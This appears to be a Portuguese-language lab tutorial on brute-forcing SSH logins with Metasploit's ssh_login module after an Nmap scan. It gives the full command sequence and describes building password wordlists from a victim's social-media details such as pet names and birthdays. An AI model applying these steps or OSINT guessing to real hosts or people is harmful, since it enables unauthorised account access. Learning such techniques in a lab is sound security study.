# Metasploit (Brute Force SSH com ssh_login)
visão geral

Aqui foi utilizado o Metasploit Framework para testar acesso via SSH usando credenciais.

ideia geral:

descobrir um serviço SSH ativo
tentar autenticar com usuário/senha
validar se o acesso é possível

## Fluxo completo usado

### 1. Abrindo
🖥️ msfconsole

inicializa o framework e conecta ao banco de dados

### 2. Procurando módulo
🖥️ search ssh_login

resultado:

auxiliary/scanner/ssh/ssh_login

o que esse módulo faz:

tenta login via SSH
usando credenciais definidas
ou listas (wordlists)

### 3. Usando o módulo
🖥️ use auxiliary/scanner/ssh/ssh_login

### 4. Definindo o alvo
🖥️ set RHOSTS xxx.xxx.xxx.xxx

RHOSTS = IP do alvo

[no meu caso: uma VM (lab interno)]

# Etapa essencial antes: Descobrir o SSH (Nmap)

antes de atacar, normalmente precisa descobrir se o SSH tá aberto

Isso é feito com o Nmap: 
🖥️ nmap -p 22 xxx.xxx.xxx.xxx

ou mais completo: 
🖥️ nmap -sV xxx.xxx.xxx.xxx

## o que isso faz:

-p 22 → testa porta padrão do SSH
-sV → detecta versão do serviço

exemplo de resultado:

22/tcp open  ssh  OpenSSH 8.2

### 5. Definindo usuário
🖥️ set USERNAME nometeste
### 6. Definindo senha
🖥️ set PASSWORD senhateste

# Aqui entra o perigo do OSINT

em cenário real, o atacante raramente “chuta” senha aleatória, ele usa OSINT (informação pública)

## exemplos de onde vem senha:

redes sociais

datas importantes (aniversário)

nome de pet

isso vira:

wordlists personalizadas

muito mais eficaz que brute force cego


exemplo:
se a vítima posta:

“amo meu cachorro rex 🐶”

senha possível:

rex123

### 7. Executando o ataque
🖥️ run

o Metasploit vai:

tentar login via SSH
usando as credenciais fornecidas

Resultado esperado

Se der certo:

[+] Success: 'usuario:senha'

Se falhar:

[-] Failed login

# resumo sem comentários:
nmap xxx.xxx.xxx.xxx



msfconsole

search ssh_login

use auxiliary/scanner/ssh/ssh_login


set RHOSTS xxx.xxx.xxx.xxx

set USERNAME teste

set PASSWORD teste

run

